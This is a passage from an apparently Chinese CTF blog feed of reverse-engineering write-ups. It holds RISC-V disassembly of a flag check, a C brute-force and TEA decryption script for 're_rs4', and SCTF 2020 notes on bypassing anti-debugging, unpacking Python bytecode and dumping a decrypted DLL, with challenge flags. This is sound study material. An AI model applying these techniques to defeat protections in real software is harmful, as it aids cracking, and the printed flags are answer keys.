<span class="hljs-number">12</span>f<span class="hljs-number">71</span>e<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">1050a</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1050e</span>:       <span class="hljs-number">04</span>c<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">76</span><br><span class="hljs-attribute">10512</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10514</span>:       <span class="hljs-number">3</span>f<span class="hljs-number">000793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">1008</span><br><span class="hljs-attribute">10518</span>:       <span class="hljs-number">12</span>f<span class="hljs-number">71563</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">1051c</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10520</span>:       <span class="hljs-number">05078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">80</span><br><span class="hljs-attribute">10524</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10526</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">10528</span>:       <span class="hljs-number">3</span>cb<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">971</span> # <span class="hljs-number">0</span>x<span class="hljs-number">13</span>cb<br><span class="hljs-attribute">1052c</span>:       <span class="hljs-number">10</span>f<span class="hljs-number">71</span>b<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10530</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10534</span>:       <span class="hljs-number">05478793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">84</span><br><span class="hljs-attribute">10538</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">1053a</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">1053c</span>:       c<span class="hljs-number">6078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">928</span> # <span class="hljs-number">0</span>xc<span class="hljs-number">60</span><br><span class="hljs-attribute">10540</span>:       <span class="hljs-number">10</span>f<span class="hljs-number">71163</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10544</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10548</span>:       <span class="hljs-number">05878793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">88</span><br><span class="hljs-attribute">1054c</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">1054e</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">10550</span>:       eac<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">340</span> # <span class="hljs-number">0</span>xeac<br><span class="hljs-attribute">10554</span>:       <span class="hljs-number">0</span>ef<span class="hljs-number">71763</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10558</span>:       fe<span class="hljs-number">842703</span>                lw      x<span class="hljs-number">14</span>,-<span class="hljs-number">24</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1055c</span>:       <span class="hljs-number">02200793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">34</span><br><span class="hljs-attribute">10560</span>:       <span class="hljs-number">0</span>ef<span class="hljs-number">71163</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10564</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10568</span>:       <span class="hljs-number">05</span>c<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">92</span><br><span class="hljs-attribute">1056c</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">1056e</span>:       <span class="hljs-number">2</span>d<span class="hljs-number">500793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">725</span><br><span class="hljs-attribute">10572</span>:       <span class="hljs-number">0</span>cf<span class="hljs-number">71863</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10576</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1057a</span>:       <span class="hljs-number">06078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">96</span><br><span class="hljs-attribute">1057e</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10580</span>:       <span class="hljs-number">54700793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">1351</span><br><span class="hljs-attribute">10584</span>:       <span class="hljs-number">0</span>af<span class="hljs-number">71</span>f<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10588</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1058c</span>:       <span class="hljs-number">06478793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">100</span><br><span class="hljs-attribute">10590</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10592</span>:       <span class="hljs-number">2</span>d<span class="hljs-number">500793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">725</span><br><span class="hljs-attribute">10596</span>:       <span class="hljs-number">0</span>af<span class="hljs-number">71663</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">1059a</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">1059e</span>:       <span class="hljs-number">06878793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">104</span><br><span class="hljs-attribute">105a2</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">105a4</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">105a6</span>:       a<span class="hljs-number">5078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1456</span> # <span class="hljs-number">0</span>xa<span class="hljs-number">50</span><br><span class="hljs-attribute">105aa</span>:       <span class="hljs-number">08</span>f<span class="hljs-number">71</span>c<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">105ae</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">105b2</span>:       <span class="hljs-number">06</span>c<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">108</span><br><span class="hljs-attribute">105b6</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">105b8</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">105ba</span>:       eac<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">340</span> # <span class="hljs-number">0</span>xeac<br><span class="hljs-attribute">105be</span>:       <span class="hljs-number">08</span>f<span class="hljs-number">71263</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">105c2</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">105c6</span>:       <span class="hljs-number">07078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">112</span><br><span class="hljs-attribute">105ca</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">105cc</span>:       <span class="hljs-number">12200793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">290</span><br><span class="hljs-attribute">105d0</span>:       <span class="hljs-number">06</span>f<span class="hljs-number">71963</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">105d4</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">105d8</span>:       <span class="hljs-number">07478793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">116</span><br><span class="hljs-attribute">105dc</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">105de</span>:       <span class="hljs-number">6789</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">105e0</span>:       <span class="hljs-number">99</span>f<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1633</span> # <span class="hljs-number">0</span>x<span class="hljs-number">199</span>f<br><span class="hljs-attribute">105e4</span>:       <span class="hljs-number">04</span>f<span class="hljs-number">71</span>f<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">105e8</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">105ec</span>:       <span class="hljs-number">07878793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">120</span><br><span class="hljs-attribute">105f0</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">105f2</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">105f4</span>:       <span class="hljs-number">12978793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">297</span> # <span class="hljs-number">0</span>x<span class="hljs-number">1129</span><br><span class="hljs-attribute">105f8</span>:       <span class="hljs-number">04</span>f<span class="hljs-number">71563</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">105fc</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10600</span>:       <span class="hljs-number">07</span>c<span class="hljs-number">78793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">124</span><br><span class="hljs-attribute">10604</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10606</span>:       <span class="hljs-number">1</span>e<span class="hljs-number">000793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">480</span><br><span class="hljs-attribute">1060a</span>:       <span class="hljs-number">02</span>f<span class="hljs-number">71</span>c<span class="hljs-number">63</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">1060e</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10612</span>:       <span class="hljs-number">08078793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">128</span><br><span class="hljs-attribute">10616</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">10618</span>:       <span class="hljs-number">6</span>c<span class="hljs-number">000793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">0</span>,<span class="hljs-number">1728</span><br><span class="hljs-attribute">1061c</span>:       <span class="hljs-number">02</span>f<span class="hljs-number">71363</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br><span class="hljs-attribute">10620</span>:       fec<span class="hljs-number">42783</span>                lw      x<span class="hljs-number">15</span>,-<span class="hljs-number">20</span>(x<span class="hljs-number">8</span>)<br><span class="hljs-attribute">10624</span>:       <span class="hljs-number">08478793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">132</span><br><span class="hljs-attribute">10628</span>:       <span class="hljs-number">4398</span>                    c.lw    x<span class="hljs-number">14</span>,<span class="hljs-number">0</span>(x<span class="hljs-number">15</span>)<br><span class="hljs-attribute">1062a</span>:       <span class="hljs-number">6785</span>                    c.lui   x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">1062c</span>:       <span class="hljs-number">87878793</span>                addi    x<span class="hljs-number">15</span>,x<span class="hljs-number">15</span>,-<span class="hljs-number">1928</span> # <span class="hljs-number">0</span>x<span class="hljs-number">878</span><br><span class="hljs-attribute">10630</span>:       <span class="hljs-number">00</span>f<span class="hljs-number">71963</span>                bne     x<span class="hljs-number">14</span>,x<span class="hljs-number">15</span>,<span class="hljs-number">0</span>x<span class="hljs-number">10642</span><br></code></pre></td></tr></table></figure><p>截取部分反汇编代码，搜索关键字符串地址就能定位到比较处</p><h1 id="re-rs4"><a href="#re-rs4" class="headerlink" title="re_rs4"></a>re_rs4</h1><p>tea</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> index[] = &#123; <span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span> &#125;;<br>FILE* c = fopen(<span class="hljs-string">&quot;C:\\Users\\pisanbao\\Dropbox\\My PC (DESKTOP-TIPJDRO)\\Desktop\\temp.jpg&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> aaa = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[], DWORD* filebuffer)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v19 = *(DWORD *)filebuffer, v20 = *(DWORD *)(filebuffer+<span class="hljs-number">1</span>);<span class="hljs-comment">//jpg开头前8字节，👴猜这jpg必是标准jpg</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)<br>&#123;<br>a -= <span class="hljs-number">1640531527</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)<br>&#123;<br>v20 -= (((v19 &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * v19)) + v19) ^ (flag[index[<span class="hljs-number">63</span><span class="hljs-number">-2</span>*i]] + a);<br>a += <span class="hljs-number">1640531527</span>;<br>v19 -= ((((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v20 &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * v20)) + v20) ^ (flag[index[<span class="hljs-number">63</span><span class="hljs-number">-2</span>*i<span class="hljs-number">-1</span>]] + a);<br>&#125;<br>fwrite(&amp;v19, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, c);<br>fwrite(&amp;v20, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, c);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">if (v19 == 0xE0FFD8FF &amp;&amp; v20 == 0x464A1000)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">printf(&quot;ylb_sb\n&quot;);</span><br><span class="hljs-comment">printf(&quot;%s&quot;, flag);</span><br><span class="hljs-comment">&#125;*/</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> table[] = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;-_[]`@&quot;</span>;<br><span class="hljs-keyword">int</span> i,j,k,l;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> data[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[<span class="hljs-number">5</span>] = <span class="hljs-string">&quot;xbvu&quot;</span>;<br>FILE* a;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> srcaddr[] = <span class="hljs-string">&quot;C:\\Users\\pisanbao\\Dropbox\\My PC (DESKTOP-TIPJDRO)\\Desktop\\output.jpg&quot;</span>;<br>a = fopen(srcaddr, <span class="hljs-string">&quot;rb&quot;</span>);<br>fseek(a, <span class="hljs-number">0</span>, SEEK_END);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> filesize = ftell(a);<br>fseek(a, <span class="hljs-number">0</span>, SEEK_SET);<br>DWORD* filebuffer = (DWORD*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, filesize);<br>fread(filebuffer, filesize, <span class="hljs-number">1</span>, a);<br><span class="hljs-keyword">int</span> temp = filesize / <span class="hljs-number">8</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; temp; i++)<br>&#123;<br>decode(flag, (DWORD*)(filebuffer+<span class="hljs-number">2</span>*i));<br>&#125;<br><span class="hljs-comment">/*decode(flag);*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for (i = 0; i &lt; 70; i++)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">for (j = 0; j &lt; 70; j++)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">for (k = 0; k &lt; 70; k++)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">for (l = 0; l &lt; 70; l++)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">flag[0] = table[i];</span><br><span class="hljs-comment">flag[1] = table[j];</span><br><span class="hljs-comment">flag[2] = table[k];</span><br><span class="hljs-comment">flag[3] = table[l];</span><br><span class="hljs-comment">decode(flag);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;*/</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>爆破出key”xbvu”;<br>然后解密</p><p>出题人貌似写的有问题，tea的key录入16字节</p><p>但是函数返回一字节，说白了就是16字节分4组，每组4字节加密，本来应该是这样的但是出题人写的函数返回值是1字节就是16字节输入只要每4个开头哪一个字节被用到了</p><p>所以只需要爆破4字节然后写解密即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sctf 2020 writeup</title>
    <link href="/2020/09/17/sctf-2020-writeup/"/>
    <url>/2020/09/17/sctf-2020-writeup/</url>
    
    <content type="html"><![CDATA[<p>sctf re writeup</p><a id="more"></a><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="get-up"><a href="#get-up" class="headerlink" title="get_up"></a>get_up</h2><p>smc+md5+rc4</p><p><img src="C:\Users\pisanbao\AppData\Roaming\Typora\typora-user-images\image-20200916220945399.png" alt="image-20200916220945399"></p><p>md5解出sycsyc</p><p>后面又一个smc然后rc4</p><p>SCTF{zzz~(|3[___]_rc4_5o_e4sy}</p><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>python打包，解包，找字符串后添加文件头一气呵成</p><p>结果反编译不了，很懵逼，猜测花指令，查看后发现没有</p><p>后来看了wp知道是python3.8…太坑了，以前都是直接百度python在线反编译拖进去就行了</p><p>反编译后大致逻辑就出来了</p><p>看temp.dll，一个多项式算法一个xor</p><p>SCTF{We1c0m3_To_Sctf_2020_re_!!}</p><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>挺有意思的题目,有个假flag一开始没看到</p><p><img src="image-20200918143312989.png" alt="image-20200918143312989"></p><p>因为题目有花和简单的反调试直接给patch了</p><p>上面flag直接输入显示是正确，猜测有校验函数</p><p>sub_409FF0才是真正函数，通过40A310注册aexit来执行，调试很简单，再sub_409FF0下断点，因为main有isdebuggerpresent会return，走到aexit就会执行</p><p><img src="image-20200918162641109.png" alt="image-20200918162641109"></p><p>检查是否解密成功（如果在main函数下断点会影响解密，具体可以自己看解密dll流程，这也就是那个“校验”）</p><p><img src="image-20200918164436028.png" alt="image-20200918164436028"></p><p>向指定地址写入dll</p><p><img src="image-20200918164552224.png" alt="image-20200918164552224"></p><p>下面imagebase相减一看就知道是重定位操作了，可以忽视，一般不需要重定位，前面alloc的时候已经指定目标dll地址为imagebase了</p><p><img src="image-20200918165114619.png" alt="image-20200918165114619"></p><p>然后调用初始化dll</p><p><img src="image-20200918165644425.png" alt="image-20200918165644425"></p><p>这边调用的才是真正的打印函数</p><p><img src="image-20200918165940532.png" alt="image-20200918165940532"></p><p>后面sub_40CBB0计算出encode函数然后调用</p><p><img src="image-20200918171139236.png" alt="image-20200918171139236"></p><p>把dll dump出来后看encode函数即可</p><p><img src="image-20200918171217850.png" alt="image-20200918171217850"></p><figure class="highlight 